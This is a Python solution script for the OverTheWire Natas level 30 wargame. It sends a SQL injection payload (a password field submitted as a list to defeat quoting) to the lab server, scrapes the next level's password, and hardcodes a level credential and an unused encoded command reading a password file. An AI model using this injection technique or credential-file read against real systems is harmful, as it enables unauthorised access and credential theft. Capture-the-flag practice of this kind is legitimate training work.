#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 30."""

import base64
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas30.natas.labs.overthewire.org/index.pl"

lvl_user = "natas30"
lvl_pass = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"

headers = {
    "User-Agent": UserAgent().random
    }

cmd = base64.b64encode(b"cat /etc/natas_webpass/natas30").decode()

try:
    res = r.post(
        url,
        data={"username": "natas31", "password": ["'foo' or 1", 4]},
        headers=headers,
        auth=HTTPBasicAuth(lvl_user, lvl_pass))

    status = res.status_code

    if status == 200:
        password = res.text.split("\n")[-5].split(">")[2]
        password = password.split("<")[0].replace("natas31", "")

except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")
